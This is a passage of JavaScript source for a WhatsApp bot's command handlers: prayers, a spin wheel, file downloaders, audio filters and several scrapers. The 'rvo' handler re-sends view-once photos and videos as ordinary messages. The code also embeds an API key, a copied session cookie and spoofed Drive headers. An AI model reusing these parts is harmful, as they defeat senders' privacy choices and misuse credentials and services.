    "ayat": "اَلْحَمْدُ ِللهِ الَّذِىْ اَطْعَمَنَا وَسَقَانَا وَجَعَلَنَا مُسْلِمِيْنَ",
    "latin": "Alhamdulillahilladzi ath-amanaa wa saqoonaa wa ja'alanaa minal muslimiin.",
    "artinya": "Segala puji bagi Allah yang telah memberi kami makan dan minum serta menjadikan kami termasuk dari kaum muslimin."
  },
  {
    "id": "32",
    "doa": "Doa ketika turun hujan",
    "ayat": "اللَّهُمَّ صَيِّبًا نَافِعًا",
    "latin": "Allahumma shayyiban nafi’an.",
    "artinya": "Ya Allah, curahkanlah air hujan yang bermanfaat. (HR Bukhar dari Aisyah RA)"
  },
  {
    "id": "33",
    "doa": "Doa ketika takut bahaya hujan lebat",
    "ayat": "اللَّهُمَّ حَوَالَيْنَا وَلاَ عَلَيْنَا ، اللَّهُمَّ عَلَى الآكَامِ وَالظِّرَابِ ، وَبُطُونِ الأَوْدِيَةِ ، وَمَنَابِتِ الشَّجَرِ",
    "latin": "Allahumma hawalaina wala ‘alaina. Allahumma ‘alal akami wa adhirabi, wa buthunil auwdiyati, wamanabitisyajari.",
    "artinya": "Ya Allah turunkan hujan ini di sekitar kami jangan di atas kami. Ya Allah curahkanlah hujan ini di atas bukit-bukit, di hutan-hutan lebat, di gunung-gunung kecil, di lembah-lembah, dan tempat-tempat tumbuhnya pepohonan. (HR Bukhari Muslim)"
  },
  {
    "id": "34",
    "doa": "Doa setelah turun hujan",
    "ayat": "مُطِرْنَا بِفَضْلِ اللـهِ ورَحْمَتِهِ",
    "latin": "Muthirnaa bifadhlillahi wa rahmatihi.",
    "artinya": "Diturunkan kepada kami hujan berkat anugerah Allah dan rahmat-Nya. (HR Bukhari)"
  },
  {
    "id": "35",
    "doa": "Doa bertemu binatang buas",
    "ayat": "إِنَّهُۥ مِن سُلَيْمَٰنَ وَإِنَّهُۥ بِسْمِ ٱللَّهِ ٱلرَّحْمَٰنِ ٱلرَّحِيمِ",
    "latin": "Innahụ min sulaimāna wa innahụ bismillāhir-raḥmānir-raḥīm",
    "artinya": "Sesungguhnya surat itu, dari SuIaiman dan sesungguhnya (isi)nya: Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang. (Qs. An Naml: 30 )"
  },
  {
    "id": "36",
    "doa": "Doa agar selalu dicukupkan rezeki",
    "ayat": "اَللّٰهُمَّ اَكْفِنِيْ بِحَلَالِكَ عَنْ حَرَامِكَ، وَأَغْنِنِيْ بِفَضْلِكَ عَمَّنْ سِوَاكَ",
    "latin": "Allahummakfini bihalalika ‘an haramik wa aghnini bifadhlika amman siwak",
    "artinya": "Ya Allah, berilah aku kecukupan dengan rezeki yang halal, sehingga aku tidak memerlukan yang haram, dan berilah aku kekayaan dengan karuniamu, sehingga aku tidak memerlukan bantuan orang lain, selain diri-mu. (HR. Ahmad)"
  },
  {
    "id": "37",
    "doa": "Doa ketika menyisir rambut",
    "ayat": "اَللّهُمَّ حَرِّمْ شَعْرِى وَبَشَرِى عَلىَ النَّار",
    "latin": "ALLAHUMMA HARRIM SYA'RII WA BASYARII 'ALAN NAAR",
    "artinya": "Ya Allah, halangilah rambut dan kulitku dari api neraka"
  }
]
var tobat = pickRandom(pripayerr)
let deks = ` [ *DOA HARIAN* ]

- ${tobat.doa}

Verse: ${tobat.ayat}
Latin: ${tobat.latin}
It means: ${tobat.artinya}
`
m.reply(deks)
}
break
case 'turn': {
    if (!text || !text.includes('|')) {
        return m.reply(`Please enter multiple options separated by "|" (example: ${prefix + command} chicken|rice|banana|apple)`)
    }
const { createCanvas } = require('canvas')
let previousResult = null
    const items = text.split('|').map(item => item.trim())

    if (items.length < 2) {
        return m.reply('Enter at least two choices to play!')
    }

    let randomIndex, selectedItem
    do {
        randomIndex = Math.floor(Math.random() * items.length)
        selectedItem = items[randomIndex]
    } while (selectedItem === previousResult)

    previousResult = selectedItem

    const canvas = createCanvas(400, 400)
    const ctx = canvas.getContext('2d')

    const colors = ['#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0']
    const centerX = canvas.width / 2
    const centerY = canvas.height / 2
    const outerRadius = 150
    const innerRadius = 30
    const angleStep = (2 * Math.PI) / items.length

    items.forEach((item, index) => {
        const startAngle = index * angleStep
        const endAngle = startAngle + angleStep

        ctx.beginPath()
        ctx.moveTo(centerX, centerY)
        ctx.arc(centerX, centerY, outerRadius, startAngle, endAngle)
        ctx.fillStyle = colors[index % colors.length]
        ctx.fill()
        ctx.stroke()

        const textAngle = startAngle + angleStep / 2
        const textX = centerX + outerRadius / 1.5 * Math.cos(textAngle)
        const textY = centerY + outerRadius / 1.5 * Math.sin(textAngle)
        ctx.fillStyle = 'black'
        ctx.font = '20px Arial'
        ctx.fillText(item, textX - ctx.measureText(item).width / 2, textY)
    })

    ctx.beginPath()
    ctx.arc(centerX, centerY, innerRadius, 0, 2 * Math.PI)
    ctx.fillStyle = 'white'
    ctx.fill()

    const arrowLength = 50
    const arrowWidth = 10
    const selectedAngle = randomIndex * angleStep + angleStep / 2

    const arrowTipX = centerX + (outerRadius + 10) * Math.cos(selectedAngle)
    const arrowTipY = centerY + (outerRadius + 10) * Math.sin(selectedAngle)
    const arrowBase1X = centerX + (outerRadius + 10 + arrowWidth) * Math.cos(selectedAngle - Math.PI / 12)
    const arrowBase1Y = centerY + (outerRadius + 10 + arrowWidth) * Math.sin(selectedAngle - Math.PI / 12)
    const arrowBase2X = centerX + (outerRadius + 10 + arrowWidth) * Math.cos(selectedAngle + Math.PI / 12)
    const arrowBase2Y = centerY + (outerRadius + 10 + arrowWidth) * Math.sin(selectedAngle + Math.PI / 12)

    ctx.beginPath()
    ctx.moveTo(arrowTipX, arrowTipY)
    ctx.lineTo(arrowBase1X, arrowBase1Y)
    ctx.lineTo(arrowBase2X, arrowBase2Y)
    ctx.closePath()
    ctx.fillStyle = 'red'
    ctx.fill()
    ctx.strokeStyle = 'black'
    ctx.lineWidth = 2
    ctx.stroke()

    ctx.fillStyle = 'black'
    ctx.font = '15px Arial'
    ctx.fillText('@pontadev', 10, canvas.height - 10)

    const buffer = canvas.toBuffer()

    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `_Here are the results of the spin:  *${selectedItem}*_`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Spin Again to try again'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: buffer }, { upload: David.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"Spin Lagi\",\"id\":\".putar ${text}\"}`
                        }],
                    })
                })
            }
        }
    }, { quoted: m })

    return await David.relayMessage(m.chat, msgs.message, {})
}
break
case 'sfile': {
	if (args[0] && args[0].match(/(https:\/\/sfile.mobi\/)/gi)) {
	  const sfile = {
	search: async (query, page = 1) => {
		let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
		let $ = cheerio.load(await res.text()), arr = []
		$('div.list').each((idx, el) => {
			let title = $(el).find('a').text(),
				size = $(el).text().trim().split(' (')[1],
				link = $(el).find('a').attr('href')
			if (link) arr.push({ title, size: size.replace(')', ''), link })
		})
		return arr
	},
	download: async url => {
		let res = await fetch(url)
		let $ = cheerio.load(await res.text()), obj = {}
		obj.filename = $('div.w3-row-padding').find('img').attr('alt')
		obj.mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
		obj.filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
		obj.download = await getLink(url)
		return obj
	}
}

async function getLink(url) {
	url = 'https://sfile.mobi/download' + (new URL(url)).pathname
	let html = await (await fetch(url)).text()
	return html.split('" rel="nofollow"')[0].split('start, <a href="')[1]
}
		let res = await sfile.download(args[0])
		if (!res) throw 'Error'
		await m.reply(Object.keys(res).map(v => `*• ${v.capitalize()}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
		await David.sendMessage(
			m.chat,
			{
				document: { url: res.download },
				fileName: res.filename,
				mimetype: res.mimetype,
			},
			{ quoted: m },
		);
	} else if (args[0]) {
		let query = args.join` `.split`|`[0], page = parseInt(args.join` `.split`|`[1]) || 1,
			res = await sfile.search(query, page)
		if (!res.length) return reply(`Query "${query}" not found`)
		res = res.map(v => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
		await reply(res + `\nPage: ${page}`)
	} else return m.reply(`Enter Query Or Link!\n\nExample:\n${prefix + command} growtopia\n${prefix + command} https://sfile.mobi/1BnLYfsHEcO7`)
}
break

case 'songai':
case 'songgen': {
    if (!text) {
        return reply(`Enter text\nExample: ${prefix + command} i love David Cyril`);
    }
    const api = {
    xterm: {
        url: "https://ai.xterm.codes",
        key: "Bell409"
    }
}; 
    const SongGenerator = async (prompt) => {
        try {
            const { key } = await David.sendMessage(m.chat, { text: "Please wait.." }, { quoted: m });
            const response = await axios({
                method: 'post',
                url: `${api.xterm.url}/api/audioProcessing/song-generator`,
                params: { prompt, key: api.xterm.key },
                responseType: 'stream'
            });
            return new Promise((resolve, reject) => {
                response.data.on('data', (chunk) => {
                    try {
                        const eventString = chunk.toString();
                        const eventData = eventString.match(/data: (.+)/);
                        if (eventData && eventData[1]) {
                            const data = JSON.parse(eventData[1]);
                            switch (data.status) {
                                case 'queueing':
                                case 'generating':
                                    David.sendMessage(m.chat, { text: data.msg, edit: key });
                                    break;
                                case 'failed':
                                    response.data.destroy();
                                    reject(new Error(data.msg));
                                    break;
                                case 'success':
                                    response.data.destroy();
                                    resolve(data);
                                    break;
                                default:
                                    David.sendMessage(m.chat, { text: "Unknown status: " + data, edit: key });
                            }
                        }
                    } catch (e) {
                        David.sendMessage(m.chat, { text: "Error processing chunk: " + e.message, edit: key });
                        response.data.destroy();
                        reject(e);
                    }
                });
                response.data.on('error', (err) => {
                    David.sendMessage(m.chat, { text: "Stream error: " + err.message, edit: key });
                    reject(err);
                });
            });
        } catch (error) {
            David.sendMessage(m.chat, { text: "Error: " + error.message, edit: key });
            throw error;
        }
    };
    try {
        const data = await SongGenerator(text);
        await David.sendPresenceUpdate('recording', m.chat);
        await David.sendMessage(m.chat, { audio: { url: data.result.audioUrl }, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
        let doc = {
            text: data.result.lyrics,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `${ucapanWaktu} ${m.pushName}`,
                    body: `𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒`,
                    sourceUrl: "https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L",
                    thumbnail: fkethmb
                }
            }
        };
        await David.sendMessage(m.chat, doc, { quoted: m });  
    } catch (err) {
        console.error(err);
    }
    }
    break;
                case 'userjid':{
          	if(!isCreator) return reply(mess.OnlyOwner)
        const groupMetadata = m.isGroup ? await David.groupMetadata(m.chat).catch((e) => {}) : ""
		
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${mem.id}\n`
        }
      reply(textt)
    }
    break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await David.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                David.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
case 'spotify': case 'spotifysearch': {
if (!text) return m.reply('❌ *Spotify Search* ❌\n\nPlease enter keywords to search for songs on Spotify.')
  try {
 do2 = await searchSpotifyTracks(text)
let ini_text = '✨ *Spotify Search* ✨';
for (const x of do2) {
ini_text += `\n
      •🎵 *Title:* ${x.name}
👥 *Artist:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artist Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Album Release Date:* ${x.album.release_date}
🆔 *Album ID:* ${x.album.id}
🎵 *Album Track Count:* ${x.album.total_tracks}
🔢 *Track Number:* ${x.album.track_number}
⏳ *Duration:* ${x.duration_ms} ms
🔗 *Url:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}\n
───────────────────
`;
}
reply(ini_text)
} catch (e) {
    return m.reply('❌ *Spotify Search* ❌\n\nAn Error Occurred, Please Try Again Later.')
  }
  }
break
	    
case 'quotes': {
  try {
    if (!q) return m.reply(`example\n\n .quotes David Cyril Is the Best`);
// wm avs
    const { createCanvas, loadImage } = require('canvas');
    const fs = require('fs');
    const path = require('path');
// wm avs
    const canvasWidth = 800;
    const canvasHeight = 400;
    const canvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = canvas.getContext('2d');
// wm avs
    ctx.fillStyle = '#ffffff'; //serah kalian kalau mau ubah warna
    ctx.fillRect(0, 0, canvasWidth, canvasHeight);
// wm avs
    ctx.fillStyle = '#000000';
    ctx.font = 'bold 32px Arial';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
// wm avs
    const words = q.split(' ');
    const lines = [];
    let currentLine = '';
// wm avs    
    words.forEach(word => {
      const testLine = currentLine + word + ' ';
      const testWidth = ctx.measureText(testLine).width;
      if (testWidth > canvasWidth - 40) {
        lines.push(currentLine);
        currentLine = word + ' ';
      } else {
        currentLine = testLine;
      }
    });
    lines.push(currentLine);
// wm avs
    const lineHeight = 40;
    const textY = (canvasHeight - (lines.length * lineHeight)) / 2;
// wm avs
    lines.forEach((line, index) => {
      ctx.fillText(line.trim(), canvasWidth / 2, textY + (index * lineHeight));
    });
// wm avs
    const outputPath = path.join(__dirname, 'quote.png');
    const out = fs.createWriteStream(outputPath);
    const stream = canvas.createPNGStream();
    stream.pipe(out);
// wm avs
    out.on('finish', async () => {
      await David.sendMessage(from, { image: { url: outputPath }, caption: '_done nih_.', fileName: 'quote.png' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
// wm avs
} catch (err) {
    console.error(err);
    m.reply('error bntar.');
  }
}
break


case 'quote': {
    if (!text || !text.includes('|')) {
        return reply(`*Usage:* .quote <text>|<name>\n\n*Example:* .quote Be yourself|Albert Einstein`);
    }

    try {
        // Split the input into text and name
        const [quoteText, author] = text.split('|').map(t => t.trim());
        const font = 'Poppins-Bold'; // Default font
        let imageUrl;

        // Check if the command is replying to an image
        if (/image/.test(mime)) {
            const mediaPath = await David.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath); // Clean up the downloaded file
                return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
        } 
        // If no image is replied to, use a default image
        else {
            imageUrl = 'https://cdn.popcat.xyz/popcat.png'; // Default image
        }

        // Call the Quote API
        const apiResponse = await axios.get(`https://api.popcat.xyz/quote`, {
            params: { image: imageUrl, text: quoteText, font, name: author }
        });

        if (apiResponse.status === 200) {
            const quoteImageUrl = apiResponse.request.res.responseUrl; // The URL of the generated quote image

            // Send the quote image back to the user
            await David.sendMessage(m.chat, {
                image: { url: quoteImageUrl },
                caption: `*Quote Generated Successfully!*\n\n"${quoteText}"\n- ${author}`,
            }, { quoted: m });
        } else {
            reply(`*QUOTE GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate a quote image. Try again.`);
        }
    } catch (error) {
        console.error('Error in Quote command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}



        case 'rvo': {
  const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await David.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await David.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break
        case 'pixeldrain': {
	if (!args[0])
		return reply(`Input Pixeldrain URL\n${prefix + command} > Url <\n\nExample:\n${
		prefix + command
		} https://pixeldrain.com/u/HoGp3Hva\n\n Opsi kedua:\n https://pixeldrain.com/l/2xrapNPF#item=9`);

	if (!/pixeldrain.com\//.test(args[0])) return reply("URL Please!!");
function formatSize(num) {
	return `${(num / 1000 / 1000).toFixed(2)} MB`;
}

async function fetchFileData(id) {
	const response = await axios.get(
		`https://pixeldrain.com/api/file/${id}/info`,
	);
	const json = response.data;
	const download = `https://pixeldrain.com/api/file/${id}?download`;
	return { download, ...json };
}

async function scrapeListData(url) {
	try {
		const response = await axios.get(url);
		const html = response.data;
		const $ = cheerio.load(html);

		const scriptContent = $("script")
			.toArray()
			.map((script) => $(script).html())
			.find((content) => content.includes("window.viewer_data"));

		if (scriptContent) {
			const viewerDataString = scriptContent.match(
				/window.viewer_data\s*=\s*({.*?});/,
			)[1];
			const viewerData = JSON.parse(viewerDataString);

			const data = viewerData.api_response.files.map((file) => ({
				title: file.name,
				id: file.id,
			}));

			return data;
		} else {
			console.error("window.viewer_data not found");
			return [];
		}
	} catch (error) {
		console.error("Error fetching the page:", error);
		return [];
	}
}
	const url = args[0];
	const fileIdMatch = url.match(/\/u\/(\w+)/);
	const listIdMatch = url.match(/\/l\/(\w+)/);

	if (fileIdMatch) {
		const id = fileIdMatch[1];
		const fileData = await fetchFileData(id);
		const formattedSize = formatSize(fileData.size);
		const sizeMatch = formattedSize.match(/^([\d.]+)\s*(GB|MB)$/i);

		if (!sizeMatch) {
			return m.reply("Unknown file size unit.");
		}

		const size = parseFloat(sizeMatch[1]);
		const unit = sizeMatch[2].toUpperCase();
		let sizeInMB;

		if (unit === "GB") {
			sizeInMB = size * 1024;
		} else if (unit === "MB") {
			sizeInMB = size;
		} else {
			return m.reply("Unknown file size unit.");
		}

		const w = "`";

		let message =
			`PixelDrain Downloader\n\n- Name: ${fileData.name}\n` +
			`- Size: ${formattedSize}\n` +
			`- Views: ${fileData.views}\n` +
			`- Downloads: ${fileData.downloads}\n` +
			`- Uploaded: ${fileData.date_upload.split("T")[0]}\n` +
			`- Type: ${fileData.mime_type}\n\n_Sedang Mengirim File..._`;
		await m.reply(message);

		await David.sendMessage(
			m.chat,
			{
				document: { url: fileData.download },
				fileName: fileData.name,
				mimetype: fileData.mime_type,
			},
			{ quoted: m },
		);
	} else if (listIdMatch) {
		David.pixpix = David.pixpix || {};
		const listData = await scrapeListData(url);
		if (listData.length === 0) return m.reply("No files found.");

		const fileList = listData.map((item, index) => ({
			title: item.title,
			id: item.id,
		}));

		const fileListText = fileList
			.map((item, index) => `${index + 1}. ${item.title}`)
			.join("\n");
		const { key } = await reply(`Result List:\n\n${fileListText}\n\nReply to this message with the number, link you want to display.`);
		David.pixpix[m.chat] = {
			list: fileList,
			key,
			timeout: setTimeout(
				() => {
					David.sendMessage(m.chat, { delete: key });
					setTimeout(() => {
						delete David.pixpix[m.chat];
					}, 60 * 1000);
				},
				5 * 60 * 1000,
			),
		};
	} else {
		return reply("URL Please!!");
	}
}
break
        case 'gdrive': { 
if (!text) return reply(`Example ${prefix + command} url`)
async function GDriveDl(url) {
	let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1]
	if (!id) return reply('ID Not Found')
	let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
		method: 'post',
		headers: {
			'accept-encoding': 'gzip, deflate, br',
			'content-length': 0,
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'origin': 'https://drive.google.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
			'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
			'x-drive-first-party': 'DriveWebUi',
			'x-json-requested': 'true' 
		}
	})
	let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
	if (!downloadUrl) return reply('Link Download Limit!')
	let data = await fetch(downloadUrl)
	if (data.status !== 200) throw data.statusText
	return {
		downloadUrl, fileName,
		fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
		mimetype: data.headers.get('content-type')
	}
}
try {
  let kanjuttgede = await GDriveDl(text)
  let bjirrbang = `*Google Drive*\n\nName: ${kanjuttgede.fileName}\nLink: ${kanjuttgede.downloadUrl}`
  reply(bjirrbang)
  await David.sendMessage(m.chat, { document: { url: kanjuttgede.downloadUrl }, fileName: kanjuttgede.fileName, mimetype: kanjuttgede.mimetype }, { quoted: m })
} catch (error) {
  m.reply(`${error.message}`)
}
}
break
case 'morphic': {
  if (!text) return reply(`Example: ${prefix + command} hai`)
async function morphic(query) {
  const url = 'https://www.morphic.sh/';
  const formData = new FormData();
  
  formData.append('1', JSON.stringify({ id: '6399a7e212fa477d1a783edade27c8354a64e1ab', bound: null }));
  formData.append('2', JSON.stringify({ id: '9eed8f3e1c51044505fd5c0d73e8d2a92572691c', bound: null }));
  formData.append('3_input', query);
  formData.append('3_include_images', 'true');
  formData.append('0', JSON.stringify([{"action":"$F1","options":{"onSetAIState":"$F2"}},{"chatId":"9TI931x","messages":[]},"$K3",false,"$undefined","$undefined"]));

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
        Accept: 'text/x-component',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        Referer: 'https://www.morphic.sh/',
        'Next-Action': 'c54d85c7f9588581807befbe1a35958acc57885b',
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        Origin: 'https://www.morphic.sh',
        Connection: 'close',
        Cookie: 'ph_phc_HK6KqP8mdSmxDjoZtHYi3MW8Kx5mHmlYpmgmZnGuaV5_posthog=%7B%22distinct_id%22%3A%220191839d-890a-7a97-b388-bc7191ac7047%22%2C%22%24sesid%22%3A%5B1724490025781%2C%220191839d-8909-72e8-b586-d66ff3bde34f%22%2C1724490025225%5D%7D',
        Priority: 'u=0',
        TE: 'trailers',
      },
      body: formData
    });

    const data = await response.text();

    const regex = /"diff":\[0,"([^"]+)"\]/g;
    let result;
    let finalText = "";

    while ((result = regex.exec(data)) !== null) {
      finalText += result[1];
    }

    return finalText;
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
try {
  let hannpler = await morphic(text)
  David.sendMessage(m.chat, {text: hannpler}, {quoted: m})
} catch (error) {
  m.reply("Error!!!")
}
}
break
case 'pixiv': {
  if (!text) return reply(`Example: ${prefix + command} harimau`);
  async function pixiv(word) {
  var { get } = require("axios")
  const url = 'https://www.pixiv.net/touch/ajax/tag_portal';
  const params = { word, lang: 'en', version: 'b355e2bcced14892fe49d790ebb9ec73d2287393' };
  const headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    'Referer': 'https://www.pixiv.net/',
    'Accept-Encoding': 'gzip, deflate, br'
  };
  const { data } = await get(url, { params, headers });
  const illusts = data.body.illusts;
  const random = illusts[Math.floor(Math.random() * illusts.length)].url;
  const image = await axios.get(random, { responseType: 'arraybuffer', headers });

  return image.data;
}
  m.reply(mess.wait)
  let hannunibakwan = await pixiv(text)
  await David.sendMessage(m.chat, { image: hannunibakwan, caption: "Done" }, { quoted:m });
}
break
        case 'playstore': {
  let [tema, urutan] = text.split(/[^\w\s]/g)
  if (!tema) return m.reply("Input query!\n*Example:*\n.playstore [query]|[number]")
  m.reply(mess.wait)
  async function playstore(query) {
  let html = (await axios.get(`https://play.google.com/store/search?q=${query}&c=apps`)).data
  let $ = cheerio.load(html)
  return $("div.VfPpkd-aGsRMb").get().map(x => {
    return {
      title: $(x).find("span.DdYX5").text(),
      rating: $(x).find("span.w2kbF").text(),
      author: $(x).find("span.wMUdtb").text(),
      thumbnail: $(x).find(".j2FCNc img").attr("src").replace("s64", "s256"),
      link: "https://play.google.com" + $(x).find("a.Si6A0c").attr("href")
    }
  })
}
  try {
    let data = await playstore(tema)
    if (!urutan) return m.reply("Input query!\n*Example:*\n.playstore [query]|[number]\n\n*Select the existing numbers*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
    if (isNaN(urutan)) return m.reply("Input query!\n*Example:*\n.playstore [query]|[number]\n\n*Select the existing numbers*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
    if (urutan > data.length) return m.reply("Input query!\n*Example:*\n.playstore [query]|[number]\n\n*Select the existing numbers*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
    let out = data[urutan - 1]
    let caption = `*I N F O R M A T I O N*

*Application Title:* ${out.title || "-"}
*Link:* ${out.link || "-"}
*ID Product:* ${out.product_id || "-"}
*Rating:* ${out.rating || "-"}
*Pengembang:* ${out.author || "-"}
*Category:* ${out.category || "-"}
*Downloads:* ${out.downloads || "-"}
*Video:* ${out.video || "-"}
*Thumbnail:* ${out.thumbnail || "-"}
*Gambar Fitur:* ${out.feature_image || "-"}
*Description:* ${out.description || "-"}`
    await m.reply(caption)
  } catch (e) {
    await m.reply(`${error.message}`)
  }
}
break
      
        case 'aio': {
    if (!text) return reply(`Usage: ${prefix + command} [video link]\nLIST OF SUPPORTED LINKS:\n- YouTube\n- instagram\n- tiktok\n- facebook\n- twitter\n- and others, many more`);
    
class Fuck extends Error {
    constructor(message) {
        super(message);
        this.name = "Fuck";
    }
}

class API {
    constructor(search, prefix) {
        this.api = {
            search: search,
            prefix: prefix
        };
    }

    headers(custom = {}) {
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'authority': 'retatube.com',
            'accept': '*/*',
            'accept-language': 'id-MM,id;q=0.9',
            'hx-current-url': 'https://retatube.com/',
            'hx-request': 'true',
            'hx-target': 'aio-parse-result',
            'hx-trigger': 'search-btn',
            'origin': 'https://retatube.com',
            'referer': 'https://retatube.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Postify/1.0.0',
            ...custom
        };
    }

    handleError(error, context) {
        const errors = error.response ? JSON.stringify(error.response.data || error.message) : error.message;
        console.error(`[${context}] Error:`, errors);
        throw new Fuck(errors);
    }

    getEndpoint(name) {
        return this.api[name];
    }
}

class RetaTube extends API {
    constructor() {
        super('https://retatube.com/api/v1/aio/search', 'https://retatube.com/api/v1/aio/index?s=retatube.com');
    }

    async getPrefix() {
        try {
            const response = await axios.get(this.getEndpoint('prefix'));
            return this.scrapePrefix(response.data); 
        } catch (error) {
            this.handleError(error, 'GetPrefix');
        }
    }

    scrapePrefix(htmlContent) {
        const $ = cheerio.load(htmlContent);
        const prefix = $('#aio-search-box input[name="prefix"]').val();
        return prefix;
    }

    async fetch(videoId) {
        try {
            const prefix = await this.getPrefix();
            const response = await axios.post(this.getEndpoint('search'), `prefix=${encodeURIComponent(prefix)}&vid=${encodeURIComponent(videoId)}`, { headers: this.headers() });
            return this.parseHtml(response.data);
        } catch (error) {
            this.handleError(error, 'Fetch');
        }
    }

    parseHtml(htmlContent) {
